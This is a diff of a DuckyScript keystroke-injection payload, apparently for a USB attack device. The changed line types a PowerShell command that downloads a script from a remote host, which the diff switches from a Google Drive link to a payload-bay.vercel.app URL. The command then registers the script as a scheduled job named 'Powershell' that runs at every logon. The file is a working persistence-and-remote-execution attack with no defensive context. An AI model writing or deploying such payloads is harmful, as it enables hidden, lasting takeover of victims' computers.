@@ -18,7 +18,7 @@ LEFT
 DELAY 4000
 ENTER
 DELAY 4000
-STRING $T = New-JobTrigger -AtLogOn ; $Script = Invoke-WebRequest 'https://drive.google.com/file/d/1Ba81xd77gJAL-AeO1f0FMJVodKXwmyNC/view?usp=sharing' ; $ScriptBlock = [Scriptblock]::Create($Script.Content) ; Register-ScheduledJob -Name "Powershell" -ScriptBlock $ScriptBlock -Trigger $T
+STRING $T = New-JobTrigger -AtLogOn ; $Script = Invoke-WebRequest 'https://payload-bay.vercel.app/payload.dd.txt' ; $ScriptBlock = [Scriptblock]::Create($Script.Content) ; Register-ScheduledJob -Name "Powershell" -ScriptBlock $ScriptBlock -Trigger $T
 DELAY 4000
 ENTER
 DELAY 8000
